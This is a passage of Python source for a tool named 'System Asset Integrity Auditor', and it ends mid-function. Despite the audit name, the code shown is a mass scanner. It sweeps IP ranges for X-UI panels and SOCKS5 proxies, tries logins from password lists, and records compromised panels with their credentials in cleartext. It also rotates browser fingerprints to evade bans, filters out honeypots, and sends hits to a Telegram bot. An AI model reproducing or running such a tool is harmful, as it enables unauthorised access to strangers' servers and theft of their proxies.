import asyncio
import ipaddress
import random
import time
import sys
import os
import string
import json
import signal
import subprocess
import ctypes
import ssl
import re
import shutil
import unicodedata
import select
import traceback
import urllib.parse
import urllib.request
import gc
from datetime import datetime, timedelta

# ============================================================
#  SYSTEM ASSET INTEGRITY AUDITOR (SAIA) v23.5 - 极光UI显密版
# ============================================================

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
STATE_FILE = os.path.join(BASE_DIR, "sys_audit_state.json")
LOG_FILE = os.path.join(BASE_DIR, "sys_audit_events.log")
REPORT_FILE = os.path.join(BASE_DIR, "audit_report.log")
NODE_FILE = os.path.join(BASE_DIR, "nodes.list")
FALLBACK_NODE_FILE = os.path.join(BASE_DIR, "ip.txt")
FALLBACK_NODE_FILE_UPPER = os.path.join(BASE_DIR, "IP.TXT")
TOKEN_FILE = os.path.join(BASE_DIR, "tokens.list")
FALLBACK_TOKEN_FILE = os.path.join(BASE_DIR, "pass.txt")
GUARDIAN_STATE_FILE = os.path.join(BASE_DIR, "sys_guardian_state.json")
TELEGRAM_CFG_FILE = os.path.join(BASE_DIR, "telegram_notify.json")
RESUME_CFG_FILE = os.path.join(BASE_DIR, "resume_config.json")
FEED_CFG_FILE = os.path.join(BASE_DIR, "feed_turbo_config.json")
CHECKPOINT_FILE = os.path.join(BASE_DIR, "audit_checkpoint.json")
VERIFIED_EVENTS_FILE = os.path.join(BASE_DIR, "verified_events.log")
RUN_LOCK_FILE = os.path.join(BASE_DIR, "audit_runner.lock")
GUARDIAN_LOCK_FILE = os.path.join(BASE_DIR, "guardian_runner.lock")
GUARDIAN_CTRL_FILE = os.path.join(BASE_DIR, "guardian_control.json")
MAX_LOG_BYTES = 2 * 1024 * 1024
MAX_REPORT_BYTES = 8 * 1024 * 1024
MAX_VERIFIED_EVENTS_BYTES = 4 * 1024 * 1024
LOG_BACKUPS = 5
REPORT_BACKUPS = 3
VERIFIED_EVENTS_BACKUPS = 2
STATE_FLUSH_INTERVAL = 1.0
CHECKPOINT_FLUSH_INTERVAL = 3.0
CHECKPOINT_GROWTH_STEP = 500
CHECKPOINT_MAX_IDLE_FLUSH_SEC = 30.0
MAX_SOCKET_CONCURRENCY = 600
FEED_ACCEL_TRIGGER_RATIO = 0.5
FEED_FINAL_RUSH_RATIO = 0.1
FEED_ACCEL_FACTOR = 0.5
ADAPT_CHECK_INTERVAL = 2.0
ADAPT_MIN_CONCURRENCY = 100
ADAPT_MAX_CONCURRENCY = 1000
ADAPT_STEP_UP = 50
ADAPT_STEP_DOWN = 100
ADAPT_LOW_MB = 800.0
ADAPT_HIGH_MB = 2048.0
EXPOSE_SECRET_IN_REPORT = True
# 不再限制单个网段展开上限，改为流式逐个投喂
MAX_EXPANDED_TARGETS_PER_ENTRY = None
DEFAULT_XUI_PORTS = "54321,2053"
DEFAULT_S5_PORTS = (
    "1080-1090,1111,2222,3333,4444,5555,6666,7777,8888,9999,"
    "1234,4321,8000,9000,6868,6688,8866,9527,1472,2583,3694,10000-10010"
)
DEFAULT_MIXED_PORTS = f"{DEFAULT_XUI_PORTS},{DEFAULT_S5_PORTS}"
ASN_DB_FILE = os.path.join(BASE_DIR, "GeoLite2-ASN.mmdb")
COUNTRY_DB_CANDIDATES = [
    os.path.join(BASE_DIR, "GeoLite2-Country.mmdb"),
    os.path.join(BASE_DIR, "geolite2-country.mmdb"),
]

# Anti-Ban 浏览器指纹池
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
]

# 视觉配置 (极光配色)
C_BOLD, C_W = "\033[1m", "\033[0m"
C_BLUE = "\033[38;5;39m"  # 边框蓝
C_CYAN = "\033[38;5;51m"  # 标题青
C_PROC = "\033[38;5;48m"  # 进度绿
C_WARN = "\033[38;5;214m"  # 警告橙
C_SUCC = "\033[38;5;46m"  # 成功绿
C_DIM = "\033[2m"  # 暗色

# ==================== 工具函数 ====================


def now_ts():
    return time.time()


async def close_writer(writer):
    if writer:
        try:
            writer.close()
            await asyncio.wait_for(writer.wait_closed(), timeout=1.0)
        except (OSError, asyncio.TimeoutError):
            pass


def save_state(path, state):
    try:
        with open(path + ".tmp", "w", encoding="utf-8") as f:
            json.dump(state, f, ensure_ascii=False, indent=2)
        os.replace(path + ".tmp", path)
    except OSError:
        pass


def load_state(path):
    if not os.path.exists(path):
        return {}
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except (OSError, json.JSONDecodeError):
        return {}


def rotate_file_if_needed(file_path, max_bytes, backup_count):
    try:
        if not os.path.exists(file_path):
            return
        if os.path.getsize(file_path) < max_bytes:
            return
        for i in range(backup_count, 0, -1):
            src = file_path if i == 1 else f"{file_path}.{i - 1}"
            dst = f"{file_path}.{i}"
            if os.path.exists(src):
                if os.path.exists(dst):
                    os.remove(dst)
                os.replace(src, dst)
    except OSError:
        pass


def append_rotating(file_path, text, max_bytes, backup_count):
    rotate_file_if_needed(file_path, max_bytes, backup_count)
    try:
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(text)
    except OSError:
        pass


def log_event(msg):
    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    append_rotating(LOG_FILE, f"[{stamp}] {msg}\n", MAX_LOG_BYTES, LOG_BACKUPS)


def log_exception(context):
    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    tb = traceback.format_exc()
    append_rotating(
        LOG_FILE,
        f"[{stamp}] EXCEPTION: {context}\n{tb}\n",
        MAX_LOG_BYTES,
        LOG_BACKUPS,
    )


def record_verified_event(line):
    event = {
        "ts": now_ts(),
        "line": str(line or ""),
    }
    append_rotating(
        VERIFIED_EVENTS_FILE,
        json.dumps(event, ensure_ascii=False) + "\n",
        MAX_VERIFIED_EVENTS_BYTES,
        VERIFIED_EVENTS_BACKUPS,
    )


def collect_verified_last_24h(now_dt=None):
    if now_dt is None:
        now_dt = datetime.now()
    cutoff_ts = (now_dt - timedelta(hours=24)).timestamp()
    xui_lines, s5_lines = [], []

    paths = []
    for i in range(VERIFIED_EVENTS_BACKUPS, 0, -1):
        p = f"{VERIFIED_EVENTS_FILE}.{i}"
        if os.path.exists(p):
            paths.append(p)
    if os.path.exists(VERIFIED_EVENTS_FILE):
        paths.append(VERIFIED_EVENTS_FILE)

    for p in paths:
        try:
            with open(p, "r", encoding="utf-8", errors="replace") as f:
                for raw in f:
                    raw = raw.strip()
                    if not raw:
                        continue
                    try:
                        obj = json.loads(raw)
                        ts = float(obj.get("ts", 0))
                        line = str(obj.get("line", ""))
                    except (TypeError, ValueError, json.JSONDecodeError):
                        continue
                    if ts < cutoff_ts or not line:
                        continue
                    if "[高危-后台沦陷]" in line or "[XUI_VERIFIED]" in line:
                        xui_lines.append(line)
                    if "[优质-真穿透]" in line or "[S5_VERIFIED]" in line:
                        s5_lines.append(line)
        except OSError:
            continue

    return xui_lines, s5_lines


# --- 用这段代码替换原有的 read_last_lines 函数 ---
def read_last_lines(path, lines=50, filter_keywords=None):
    if not os.path.exists(path):
        return ""
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            all_lines = f.readlines()
            # 如果按键11或3传来了关键词，就只保留包含这些词的行
            if filter_keywords:
                all_lines = [
                    l for l in all_lines if any(k in l for k in filter_keywords)
                ]
            return "".join(all_lines[-lines:])
    except OSError:
        return ""


def collect_report_sections(limit=None):
    xui_audited, xui_verified = [], []
    s5_audited, s5_verified = [], []
    report_paths = []
    for i in range(REPORT_BACKUPS, 0, -1):
        p = f"{REPORT_FILE}.{i}"
        if os.path.exists(p):
            report_paths.append(p)
    if os.path.exists(REPORT_FILE):
        report_paths.append(REPORT_FILE)
    if not report_paths:
        return xui_audited, xui_verified, s5_audited, s5_verified

    try:
        for rp in report_paths:
            with open(rp, "r", encoding="utf-8", errors="replace") as f:
                for raw in f:
                    line = raw.rstrip("\n")
                    if not line:
                        continue

                    is_xui_audited, is_xui_verified, is_s5_audited, is_s5_verified = (
                        classify_report_line(line)
                    )

                    if is_xui_audited:
                        xui_audited.append(line)
                    if is_xui_verified:
                        xui_verified.append(line)
                    if is_s5_audited:
                        s5_audited.append(line)
                    if is_s5_verified:
                        s5_verified.append(line)
    except OSError:
        pass

    if isinstance(limit, int) and limit > 0:
        return (
            xui_audited[-limit:],
            xui_verified[-limit:],
            s5_audited[-limit:],
            s5_verified[-limit:],
        )
    return xui_audited, xui_verified, s5_audited, s5_verified


def load_all_report_lines():
    lines = []
    report_paths = []
    for i in range(REPORT_BACKUPS, 0, -1):
        p = f"{REPORT_FILE}.{i}"
        if os.path.exists(p):
            report_paths.append(p)
    if os.path.exists(REPORT_FILE):
        report_paths.append(REPORT_FILE)

    for rp in report_paths:
        try:
            with open(rp, "r", encoding="utf-8", errors="replace") as f:
                for raw in f:
                    line = raw.rstrip("\n")
                    if line:
                        lines.append(line)
        except OSError:
            continue
    return lines


def save_report_lines(lines):
    clear_report_history()
    if not lines:
        return
    try:
        with open(REPORT_FILE, "a", encoding="utf-8") as f:
            for line in lines:
                if line:
                    f.write(line + "\n")
    except OSError:
        pass


def clear_report_by_category(category):
    lines = load_all_report_lines()
    if not lines:
        return 0

    kept = []
    removed = 0
    for line in lines:
        is_xui_audited, _, is_s5_audited, _ = classify_report_line(line)
        low = line.lower()
        is_honeypot = (
            "蜜罐" in line
            or "honeypot" in low
            or "canary" in low
            or "trap" in low
            or "诱捕" in line
        )

        should_remove = False
        if category == "xui":
            should_remove = is_xui_audited
        elif category == "s5":
            should_remove = is_s5_audited
        elif category == "honeypot":
            should_remove = is_honeypot

        if should_remove:
            removed += 1
        else:
            kept.append(line)

    save_report_lines(kept)
    return removed


def collect_suspected_no_l7(limit=None):
    rows = []
    for line in load_all_report_lines():
        if "无L7能力" in line or "疑似无L7" in line:
            rows.append(line)
    if isinstance(limit, int) and limit > 0:
        return rows[-limit:]
    return rows


def merge_recent_lines(base_lines, recent_lines, limit=None):
    out = list(base_lines)
    seen = set(out)
    for line in recent_lines:
        if line and line not in seen:
            out.append(line)
            seen.add(line)
    if isinstance(limit, int) and limit > 0:
        return out[-limit:]
    return out


def classify_report_line(line):
    low = line.lower()
    if "[XUI_FOUND]" in line:
        return True, False, False, False
    if "[XUI_VERIFIED]" in line:
        return True, True, False, False
    if "[S5_VERIFIED]" in line:
        return False, False, True, True
    if "[S5_FOUND]" in line:
        return False, False, True, False

    is_xui_audited = (
        "[资产-面板存活]" in line
        or "asset[x-ui]" in low
        or "x-ui" in low
        or "xui" in low
        or "面板" in line
    )
    is_xui_verified = "[高危-后台沦陷]" in line or (
        is_xui_audited and ("验真成功" in line or "登录成功" in line)
    )

    is_s5_audited = (
        "[节点-可连通]" in line
        or "[资产-加密节点]" in line
        or "node[s5" in low
        or "node[socks" in low
        or "socks5" in low
        or "s5-open" in low
        or "s5-auth" in low
        or "需认证" in line
        or ("s5" in low and "xui" not in low)
    )
    is_s5_verified = "[优质-真穿透]" in line or (
        is_s5_audited
        and (
            "验证成功" in line
            or "认证通过" in line
            or "真穿透" in line
            or "rtt:" in low
        )
    )

    return is_xui_audited, is_xui_verified, is_s5_audited, is_s5_verified


def parse_ip_port_user_pass(line):
    ip_port = "-"
    user = "-"
    pwd = "-"

    m_ip = re.search(r"(\d{1,3}(?:\.\d{1,3}){3}:\d{1,5})", line)
    if m_ip:
        ip_port = m_ip.group(1)

    m_u = re.search(r"账号:([^|\s]+)", line)
    m_p = re.search(r"密码:([^|\s]+)", line)
    if m_u:
        user = m_u.group(1)
    if m_p:
        pwd = m_p.group(1)

    if user == "-":
        m_at = re.search(r"Node\[[^\]]+\]:\s*([^@\s]+)@", line)
        if m_at:
            user = m_at.group(1)

    if (user == "-" or pwd == "-") and m_ip:
        m_old = re.search(r"\d{1,3}(?:\.\d{1,3}){3}:\d{1,5}:([^:|\s]+):([^|\s]+)", line)
        if m_old:
            user = m_old.group(1)
            pwd = m_old.group(2)

    return ip_port, user, pwd


def extract_country_asn(line):
    country = "-"
    asn = "-"
    parts = [p.strip() for p in line.split("|")]
    for i, p in enumerate(parts):
        up = p.upper()
        if re.fullmatch(r"[A-Z]{2}", up):
            country = up
            if i + 1 < len(parts):
                nxt = parts[i + 1].strip().upper()
                if nxt.startswith("AS"):
                    asn = nxt
            break
    if asn == "-":
        m_asn = re.search(r"\bAS\d+\b", line, re.IGNORECASE)
        if m_asn:
            asn = m_asn.group(0).upper()
    return country, asn


def extract_rtt_ms(line):
    m = re.search(r"\brtt\s*[:：]\s*(\d+)\s*ms\b", line, re.IGNORECASE)
    if m:
        return m.group(1)
    return None


def is_verified_output_line(line):
    return (
        "[XUI_VERIFIED]" in line
        or "[高危-后台沦陷]" in line
        or "[S5_VERIFIED]" in line
        or "[优质-真穿透]" in line
    )


def format_result_line(line, service_tag):
    ip_port, user, pwd = parse_ip_port_user_pass(line)
    country, asn = extract_country_asn(line)
    rtt = extract_rtt_ms(line)
    suffix = f" RTT:{rtt} ms" if rtt else ""
    return f"{user}:{pwd}@{ip_port} # {service_tag}| {country} {asn}{suffix}"


def clear_report_history():
    try:
        open(REPORT_FILE, "w", encoding="utf-8").close()
    except OSError:
        pass
    for i in range(1, REPORT_BACKUPS + 1):
        p = f"{REPORT_FILE}.{i}"
        try:
            if os.path.exists(p):
                os.remove(p)
        except OSError:
            pass


def cleanup_runtime_files():
    files_to_remove = [
        STATE_FILE,
        LOG_FILE,
        REPORT_FILE,
        GUARDIAN_STATE_FILE,
        GUARDIAN_LOCK_FILE,
        GUARDIAN_CTRL_FILE,
        TELEGRAM_CFG_FILE,
        RESUME_CFG_FILE,
        FEED_CFG_FILE,
        CHECKPOINT_FILE,
        VERIFIED_EVENTS_FILE,
        RUN_LOCK_FILE,
    ]
    removed = 0

    for p in files_to_remove:
        try:
            if os.path.exists(p):
                os.remove(p)
                removed += 1
        except OSError:
            pass

    for i in range(1, LOG_BACKUPS + 1):
        try:
            p = f"{LOG_FILE}.{i}"
            if os.path.exists(p):
                os.remove(p)
                removed += 1
        except OSError:
            pass

    for i in range(1, REPORT_BACKUPS + 1):
        try:
            p = f"{REPORT_FILE}.{i}"
            if os.path.exists(p):
                os.remove(p)
                removed += 1
        except OSError:
            pass

    for i in range(1, VERIFIED_EVENTS_BACKUPS + 1):
        try:
            p = f"{VERIFIED_EVENTS_FILE}.{i}"
            if os.path.exists(p):
                os.remove(p)
                removed += 1
        except OSError:
            pass

    return removed


def one_key_cleanup():
    set_guardian_enabled(False)
    pids = set()
    for sf in (STATE_FILE, GUARDIAN_STATE_FILE):
        st = load_state(sf)
        pid = int(st.get("pid", 0) or 0) if isinstance(st, dict) else 0
        if pid > 0:
            pids.add(pid)
    lock_pid = _read_lock_pid(RUN_LOCK_FILE)
    if lock_pid > 0:
        pids.add(lock_pid)
    guardian_lock_pid = _read_lock_pid(GUARDIAN_LOCK_FILE)
    if guardian_lock_pid > 0:
        pids.add(guardian_lock_pid)

    stopped = 0
    for pid in sorted(pids):
        if stop_process(pid):
            stopped += 1

    stopped += stop_guardian_processes_fallback()

    removed = cleanup_runtime_files()
    gc.collect()
    return stopped, removed


def disable_and_stop_guardian_processes():
    set_guardian_enabled(False)
    stopped_any = False
    gpid = load_state(GUARDIAN_STATE_FILE).get("pid")
    glock_pid = _read_lock_pid(GUARDIAN_LOCK_FILE)
    if stop_process(gpid):
        stopped_any = True
    if glock_pid and glock_pid != gpid and stop_process(glock_pid):
        stopped_any = True
    if stop_guardian_processes_fallback() > 0:
        stopped_any = True
    gs = load_state(GUARDIAN_STATE_FILE)
    if isinstance(gs, dict):
        gs["status"] = "stopped"
        gs["pid"] = 0
        gs["updated_at"] = now_ts()
        gs["last_note"] = "disabled_by_user"
        save_state(GUARDIAN_STATE_FILE, gs)
    return stopped_any


def reload_running_audit():
    st = load_state(STATE_FILE)
    pid = int(st.get("pid", 0) or 0)
    if not is_alive(pid):
        return False, "当前没有运行中的审计进程"

    try:
        mode = int(st.get("mode", 0))
        work_mode = int(st.get("work_mode", 0))
        threads = int(st.get("threads", 0))
        ports_raw = str(st.get("ports_raw", "")).strip()
        feed_int = float(st.get("feed_interval", 0.02))
    except (TypeError, ValueError):
        return False, "当前任务参数不完整，无法重载"

    ports = parse_ports(ports_raw)
    if mode not in (1, 2, 3) or work_mode not in (1, 2, 3) or threads < 1 or not ports:
        return False, "当前任务参数无效，无法重载"

    if not stop_process(pid):
        return False, f"停止旧进程失败(PID {pid})"

    deadline = time.time() + 5.0
    while is_alive(pid) and time.time() < deadline:
        time.sleep(0.1)

    subprocess.Popen(
        [
            sys.executable,
            __file__,
            "run",
            str(mode),
            str(work_mode),
            str(threads),
            ports_raw,
            str(feed_int),
        ],
        start_new_session=True,
    )
    return True, f"已重载，模式:{mode_label(mode)} 线程:{threads}"


def write_list_file_from_input(file_path, split_spaces=True):
    print("请输入内容，单独输入 EOF 结束:")
    rows = []
    while True:
        try:
            raw = input()
        except KeyboardInterrupt:
            print("\n已取消输入。")
            return None
        if raw.strip() == "EOF":
            break
        if split_spaces:
            parts = [x.strip() for x in raw.strip().split() if x.strip()]
            rows.extend(parts)
        else:
            line = raw.strip()
            if line:
                rows.append(line)

    tmp_path = file_path + ".tmp"
    try:
        with open(tmp_path, "w", encoding="utf-8") as f:
            for x in rows:
                f.write(x + "\n")
        os.replace(tmp_path, file_path)
        return len(rows)
    except OSError:
        try:
            if os.path.exists(tmp_path):
                os.remove(tmp_path)
        except OSError:
            pass
        return None


def latest_ip_port(lines):
    if not lines:
        return "-"
    m = re.search(r"(\d{1,3}(?:\.\d{1,3}){3}:\d{1,5})", lines[-1])
    return m.group(1) if m else "-"


def mode_label(mode):
    return {1: "XUI专项", 2: "S5专项", 3: "深度全能"}.get(mode, str(mode))


def work_mode_label(work_mode):
    return {1: "探索", 2: "探索+验真", 3: "只验真"}.get(work_mode, str(work_mode))


def render_progress_bar(done, total, width=28):
    if total <= 0:
        return f"[{C_DIM}{'-' * width}{C_W}] 0%"
    ratio = max(0.0, min(1.0, done / total))
    fill = int(width * ratio)
    # 使用渐变色进度条
    bar_str = f"{C_PROC}{'━' * fill}{C_DIM}{'━' * (width - fill)}{C_W}"
    return f"[{bar_str}] {ratio * 100:5.1f}%"


def resolve_node_files():
    files = []
    if os.path.exists(NODE_FILE):
        files.append(NODE_FILE)
    if os.path.exists(FALLBACK_NODE_FILE):
        files.append(FALLBACK_NODE_FILE)
    if os.path.exists(FALLBACK_NODE_FILE_UPPER):
        files.append(FALLBACK_NODE_FILE_UPPER)
    return files


def resolve_token_file():
    if os.path.exists(TOKEN_FILE):
        return TOKEN_FILE
    if os.path.exists(FALLBACK_TOKEN_FILE):
        return FALLBACK_TOKEN_FILE
    return None


def mask_secret(secret):
    if EXPOSE_SECRET_IN_REPORT:
        return secret
    return "***"


def default_telegram_config():
    return {
        "enabled": False,
        "bot_token": "",
        "chat_id": "",
        "interval_minutes": 0,
        "condition_mode": 2,
        "verified_threshold": 5,
    }


def default_resume_config():
    return {"enabled": True, "skip_scanned": False}


def default_guardian_control():
    return {"enabled": False}


def load_guardian_control():
    cfg = default_guardian_control()
    data = load_state(GUARDIAN_CTRL_FILE)
    if isinstance(data, dict):
        cfg.update(data)
    cfg["enabled"] = bool(cfg.get("enabled", False))
    return cfg


def set_guardian_enabled(enabled):
    save_state(GUARDIAN_CTRL_FILE, {"enabled": bool(enabled), "updated_at": now_ts()})


def is_guardian_enabled():
    return bool(load_guardian_control().get("enabled", False))


def load_resume_config():
    cfg = default_resume_config()
    data = load_state(RESUME_CFG_FILE)
    if isinstance(data, dict):
        cfg.update(data)
    cfg["enabled"] = bool(cfg.get("enabled", True))
    cfg["skip_scanned"] = bool(cfg.get("skip_scanned", False))
    return cfg


def save_resume_config(cfg):
    save_state(RESUME_CFG_FILE, cfg)


def collect_reported_ips():
    ips = set()
    if not os.path.exists(REPORT_FILE):
        return ips
    try:
        with open(REPORT_FILE, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                m = re.search(r"\b(\d{1,3}(?:\.\d{1,3}){3})\b", line)
                if m:
                    ips.add(m.group(1))
    except OSError:
        pass
    return ips


def default_feed_turbo_config():
    return {
        "accel_trigger_ratio": FEED_ACCEL_TRIGGER_RATIO,
        "final_rush_ratio": FEED_FINAL_RUSH_RATIO,
        "accel_factor": FEED_ACCEL_FACTOR,
    }


def load_feed_turbo_config():
    cfg = default_feed_turbo_config()
    data = load_state(FEED_CFG_FILE)
    if isinstance(data, dict):
        cfg.update(data)

    try:
        trigger = float(cfg.get("accel_trigger_ratio", FEED_ACCEL_TRIGGER_RATIO))
    except (TypeError, ValueError):
        trigger = FEED_ACCEL_TRIGGER_RATIO
    trigger = max(0.0, min(1.0, trigger))

    try:
        final_rush = float(cfg.get("final_rush_ratio", FEED_FINAL_RUSH_RATIO))
    except (TypeError, ValueError):
        final_rush = FEED_FINAL_RUSH_RATIO
    final_rush = max(0.0, min(1.0, final_rush))

    try:
        factor = float(cfg.get("accel_factor", FEED_ACCEL_FACTOR))
    except (TypeError, ValueError):
        factor = FEED_ACCEL_FACTOR
    factor = max(0.0, min(1.0, factor))

    if final_rush > trigger:
        final_rush = trigger

    cfg["accel_trigger_ratio"] = trigger
    cfg["final_rush_ratio"] = final_rush
    cfg["accel_factor"] = factor
    return cfg


def save_feed_turbo_config(cfg):
    save_state(FEED_CFG_FILE, cfg)


def clear_checkpoint():
    try:
        if os.path.exists(CHECKPOINT_FILE):
            os.remove(CHECKPOINT_FILE)
    except OSError:
        pass


def load_telegram_config():
    cfg = default_telegram_config()
    data = load_state(TELEGRAM_CFG_FILE)
    if isinstance(data, dict):
        cfg.update(data)
    cfg["enabled"] = bool(cfg.get("enabled", False))
    cfg["bot_token"] = str(cfg.get("bot_token", "")).strip()
    cfg["chat_id"] = str(cfg.get("chat_id", "")).strip()
    try:
        cfg["interval_minutes"] = max(0, int(cfg.get("interval_minutes", 0)))
    except (TypeError, ValueError):
        cfg["interval_minutes"] = 0
    try:
        c_mode = int(cfg.get("condition_mode", 2))
    except (TypeError, ValueError):
        c_mode = 2
    cfg["condition_mode"] = c_mode if c_mode in (0, 1, 2, 3, 4) else 2
    try:
        cfg["verified_threshold"] = max(1, int(cfg.get("verified_threshold", 5)))
    except (TypeError, ValueError):
        cfg["verified_threshold"] = 5
    return cfg


def save_telegram_config(cfg):
    save_state(TELEGRAM_CFG_FILE, cfg)


def telegram_condition_label(mode):
    return {
        0: "关闭条件推送",
        1: "验真即推送",
        2: "仅验真推送",
        3: "验真聚合推送",
        4: "完成或验真>=阈值(单次)",
    }.get(mode, str(mode))


def send_telegram_message(bot_token, chat_id, text):
    if not bot_token or not chat_id:
        return False, "missing token/chat_id"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = urllib.parse.urlencode(
        {
            "chat_id": chat_id,
            "text": text[:3800],
            "disable_web_page_preview": "true",
        }
    ).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=payload,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=8) as resp:
            body = resp.read().decode("utf-8", errors="ignore")
            return '"ok":true' in body, body[:200]
    except Exception as exc:
        return False, str(exc)


async def send_telegram_message_async(bot_token, chat_id, text):
    return await asyncio.to_thread(send_telegram_message, bot_token, chat_id, text)


def get_geo_info(ip):
    country, asn = "-", "-"
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        return country, asn
    try:
        import geoip2.database
    except Exception:
        return country, asn

    if not hasattr(get_geo_info, "_country_reader"):
        reader = None
        for path in COUNTRY_DB_CANDIDATES:
            if os.path.exists(path):
                try:
                    reader = geoip2.database.Reader(path)
                except Exception:
                    reader = None
                break
        setattr(get_geo_info, "_country_reader", reader)

    if not hasattr(get_geo_info, "_asn_reader"):
        reader = None
        if os.path.exists(ASN_DB_FILE):
            try:
                reader = geoip2.database.Reader(ASN_DB_FILE)
            except Exception:
                reader = None
        setattr(get_geo_info, "_asn_reader", reader)

    cr = getattr(get_geo_info, "_country_reader")
    ar = getattr(get_geo_info, "_asn_reader")

    if cr:
        try:
            country = cr.country(ip).country.iso_code or "-"
        except Exception:
            pass
    if ar:
        try:
            num = ar.asn(ip).autonomous_system_number
            if num:
                asn = f"AS{num}"
        except Exception:
            pass
    return country, asn


def is_alive(pid):
    if not pid or pid <= 0:
        return False
    try:
        os.kill(pid, 0)
        return True
    except OSError:
        return False


def stop_process(pid):
    if not is_alive(pid):
        return False
    try:
        if os.name == "nt":
            subprocess.run(
                ["cmd", "/c", "taskkill", "/PID", str(pid), "/F"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=False,
            )
            return True
        os.kill(pid, signal.SIGTERM)
        return True
    except OSError:
        return False


def stop_guardian_processes_fallback():
    killed = 0

    if os.name == "nt":
        try:
            out = subprocess.check_output(
                [
                    "cmd",
                    "/c",
                    "wmic process get ProcessId,CommandLine /FORMAT:CSV",
                ],
                text=True,
                stderr=subprocess.DEVNULL,
            )
            for raw in out.splitlines():
                low = raw.lower()
                if "guardian" not in low:
                    continue
                parts = [x.strip() for x in raw.split(",") if x.strip()]
                if not parts:
                    continue
                pid_txt = parts[-1]
                if not pid_txt.isdigit():
                    continue
                pid = int(pid_txt)
                if pid > 0 and stop_process(pid):
                    killed += 1
        except (OSError, subprocess.CalledProcessError):
            pass

        try:
            ps_cmd = (
                "Get-CimInstance Win32_Process | "
                "Where-Object { $_.CommandLine -match 'guardian' } | "
                "Select-Object ProcessId,CommandLine | ConvertTo-Json -Compress"
            )
            out = subprocess.check_output(
                ["powershell", "-NoProfile", "-Command", ps_cmd],
                text=True,
                stderr=subprocess.DEVNULL,
            ).strip()
            if out:
                try:
                    rows = json.loads(out)
                except json.JSONDecodeError:
                    rows = []
                if isinstance(rows, dict):
                    rows = [rows]
                for row in rows:
                    cmdline = str(row.get("CommandLine", "")).lower()
                    if "guardian" not in cmdline:
                        continue
                    pid = int(row.get("ProcessId", 0) or 0)
                    if pid > 0 and stop_process(pid):
                        killed += 1
        except (OSError, ValueError, TypeError, subprocess.CalledProcessError):
            pass
        return killed

    try:
        out = subprocess.check_output(["ps", "-eo", "pid,args"], text=True)
        for raw in out.splitlines():
            low = raw.lower()
            if " guardian" not in low:
                continue
            seg = raw.strip().split(None, 1)
            if not seg or not seg[0].isdigit():
                continue
            pid = int(seg[0])
            if pid > 0 and stop_process(pid):
                killed += 1
    except (OSError, subprocess.CalledProcessError):
        pass
    return killed


def _read_lock_pid(lock_file):
    try:
        with open(lock_file, "r", encoding="utf-8", errors="replace") as f:
            data = json.load(f)
        return int(data.get("pid", 0))
    except (OSError, ValueError, TypeError, json.JSONDecodeError):
        return 0


def acquire_run_lock(lock_file=RUN_LOCK_FILE):
    payload = {
        "pid": os.getpid(),
        "created_at": now_ts(),
    }
    text = json.dumps(payload, ensure_ascii=False)

    for _ in range(2):
        try:
            fd = os.open(lock_file, os.O_CREAT | os.O_EXCL | os.O_WRONLY)
            try:
                os.write(fd, text.encode("utf-8", errors="ignore"))
            finally:
                os.close(fd)
            return True, 0
        except FileExistsError:
            holder_pid = _read_lock_pid(lock_file)
            if holder_pid > 0 and is_alive(holder_pid):
                return False, holder_pid
            try:
                os.remove(lock_file)
            except OSError:
                return False, holder_pid
        except OSError:
            return False, 0

    holder_pid = _read_lock_pid(lock_file)
    return False, holder_pid


def release_run_lock(lock_file=RUN_LOCK_FILE):
    holder_pid = _read_lock_pid(lock_file)
    if holder_pid not in (0, os.getpid()):
        return
    try:
        if os.path.exists(lock_file):
            os.remove(lock_file)
    except OSError:
        pass


def acquire_guardian_lock(lock_file=GUARDIAN_LOCK_FILE):
    return acquire_run_lock(lock_file)


def release_guardian_lock(lock_file=GUARDIAN_LOCK_FILE):
    release_run_lock(lock_file)


def parse_ports(raw):
    ports = []
    try:
        for p in raw.replace(" ", "").split(","):
            if not p:
                continue
            if "-" in p:
                s, e = map(int, p.split("-", 1))
                s, e = max(1, min(65535, s)), max(1, min(65535, e))
                ports.extend(range(min(s, e), max(s, e) + 1))
            else:
                pn = int(p)
                if 1 <= pn <= 65535:
                    ports.append(pn)
    except ValueError:
        return []
    return sorted(set(ports))


def iter_expanded_targets(raw_target):
    target = raw_target.strip()
    if not target:
        return

    if "/" in target:
        try:
            net = ipaddress.ip_network(target, strict=False)
            iterator = net.hosts() if net.num_addresses > 1 else [net.network_address]
            for ip_obj in iterator:
                yield str(ip_obj)
            return
        except ValueError:
            pass

    if "-" in target:
        left, right = target.split("-", 1)
        left = left.strip()
        right = right.strip()

        try:
            start_ip = ipaddress.ip_address(left)
            end_ip = ipaddress.ip_address(right)
            if start_ip.version == end_ip.version and int(end_ip) >= int(start_ip):
                span = int(end_ip) - int(start_ip) + 1
                for i in range(span):
                    yield str(ipaddress.ip_address(int(start_ip) + i))
                return
        except ValueError:
            pass

        try:
            start_ip = ipaddress.ip_address(left)
            if start_ip.version == 4 and right.isdigit():
                parts = left.split(".")
                start_last = int(parts[-1])
                end_last = int(right)
                if 0 <= end_last <= 255 and end_last >= start_last:
                    base = ".".join(parts[:3])
                    span = end_last - start_last + 1
                    for i in range(span):
                        yield f"{base}.{start_last + i}"
                    return
        except ValueError:
            pass

    yield target


def estimate_expanded_target_count(raw_target):
    target = raw_target.strip()
    if not target:
